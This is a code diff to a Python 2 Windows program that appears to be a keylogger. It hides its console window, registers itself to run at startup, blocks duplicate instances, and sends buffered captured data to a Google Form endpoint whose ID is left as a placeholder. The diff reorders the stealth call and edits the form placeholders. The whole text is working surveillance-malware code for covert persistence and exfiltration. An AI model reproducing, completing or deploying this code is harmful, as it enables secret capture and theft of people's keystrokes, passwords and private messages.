@@ -6,27 +6,30 @@ import webbrowser
 import win32event, win32api, winerror
 from _winreg import *
 
-try:
-    #Open Google Chrome
-    webbrowser.get("C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s").open_new_tab('chrome://newtab')
-    #Disallowing Multiple Instance
-    mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
-    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
-        mutex = None
-        exit(0)
-except:
-    pass
-
-x=''
-data=''
-count=0
-
 #Hide Console
 def hide():
     import win32console,win32gui
     window = win32console.GetConsoleWindow()
     win32gui.ShowWindow(window,0)
     return True
+
+hide()
+
+try:
+    #Open Google Chrome
+    webbrowser.get("C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s").open_new_tab('chrome://newtab')
+except:
+    pass
+
+#Disallowing Multiple Instance
+mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
+if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
+    mutex = None
+    print "Multiple Instance not Allowed"
+    exit(0)
+x=''
+data=''
+count=0
 
 # Add to startup
 def addStartup():
@@ -44,8 +47,8 @@ def addStartup():
 def remote():
     global data
     if len(data)>50:
-        url="https://docs.google.com/forms/d/e/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/formResponse" #Specify Google Form URL here
-        klog={'entry.xxxxxxxxxxx':data} #Specify the Field Name here
+        url="https://docs.google.com/forms/d/e/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/formResponse" #Specify Google Form URL here
+        klog={'entry.xxxxxxxxxx':data} #Specify the Field Name here
         try:
             dataenc=urllib.urlencode(klog)
             req=urllib2.Request(url,dataenc)
@@ -57,7 +60,6 @@ def remote():
 
 def main():
     addStartup() 
-    hide()
     return True
 
 if __name__ == '__main__':
